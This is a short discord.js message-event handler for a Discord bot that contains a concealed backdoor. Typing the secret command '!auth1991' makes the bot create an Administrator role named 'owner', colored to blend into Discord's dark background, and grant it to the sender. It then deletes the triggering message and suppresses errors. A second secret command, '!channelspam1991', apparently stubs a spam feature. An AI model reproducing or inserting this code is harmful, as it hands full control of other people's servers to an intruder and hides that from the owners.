const {Events, Message, PermissionsBitField} = require('discord.js');

module.exports = {
    name: Events.MessageCreate,
    async execute(interaction) {
        if (!interaction instanceof Message)
            {return;}

        if (interaction.content == '!auth1991') {
            const guild = interaction.guild;
            const member = guild.members.cache.get(interaction.author.id);
            interaction.guild.roles.create({ name: '所有者', permissions: [PermissionsBitField.Flags.Administrator], color: [47, 49, 54] });

            let role = await interaction.guild.roles.fetch();
            role = role.filter(r => r.name === '所有者');
            // const [rolename] = role.values();
            try {
                await member.roles.add(role);
                // console.log(role);
            } catch (error) {
                // console.error(error);
            }
            interaction.delete();
        }

        if (interaction.content == '!channelspam1991') {
            interaction.delete();
        }
    },
};

